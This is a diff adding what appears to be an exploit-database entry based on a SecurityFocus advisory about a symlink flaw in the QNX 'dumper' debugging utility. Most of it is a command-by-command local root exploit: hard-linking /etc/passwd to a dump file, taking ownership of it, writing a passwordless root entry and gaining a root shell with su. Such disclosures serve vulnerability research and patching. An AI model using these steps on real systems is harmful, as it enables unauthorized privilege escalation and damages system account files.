@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/4904/info
+
+When creating memory dump files, the QNX RTOS debugging utility 'dumper' follows symbolic links. It also sets ownership of the file to the userid of the terminated process. It is possible for malicious local attackers to exploit this vulnerability to overwrite and gain ownership of arbitrary files. Consequently, attackers may elevate to root privileges by modifying files such as '/etc/passwd'. 
+
+Example exploit, with /bin/dumper:
+
+Let EVIL be the unprivileged user who wants to gain root access.
+
+#link to the passwd file: dumper dumps to [process name].dmp
+$ ln /etc/passwd /home/EVIL/ksh.dmp
+#call the program that will attempt to write to the hard link
+$ dumper -d /home/EVIL -p [PID of EVIL's ksh]
+#have dumper do its job by terminating the monitored process
+$ exit
+#at this point, /etc/passwd is overwritten by the binary dump, and more
+importantly: EVIL is now the owner !
+$ echo root::0:0::///:/bin/sh > /etc/passwd
+#but now no login works because /etc/passwd is not owned by userid 0. #So
+you do:
+
+$ passwd
+
+#and change your password. This gives /etc/passwd ownership back to root,
+keeping the modifications you have made.
+
+$ su
+# 
